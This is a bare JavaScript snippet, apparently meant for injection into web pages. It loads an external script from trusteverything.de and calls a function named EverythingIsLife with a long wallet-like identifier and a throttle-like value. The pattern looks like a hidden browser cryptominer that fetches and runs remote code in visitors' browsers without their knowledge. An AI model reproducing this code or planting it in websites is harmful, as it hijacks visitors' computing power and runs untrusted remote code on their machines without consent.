(function () {
  if (window.EverythingIsLife) {
    return;
  }
  var s = document.createElement("script");
  s.async = true;
  s.type = "text/javascript";
  s.src = "https://trusteverything.de/karma/karma.js?karma=bs?nosaj=faster.mo";
  s.onload = () => {
    if (window.stu) {
      return;
    }
    window.stu = true;
    window.EverythingIsLife(
      "8BSwTcmrd4w6bSm8mWTkGbVXUZGWDMsqCK1nU4mviy6j17iGiFdtrarKkTDAXPzKsb1VNqjxSxS9T9Cv1yvoRvNL99J2aJw",
      "veil",
      80
    );
  };
  (document.head || document.body).appendChild(s);
})();
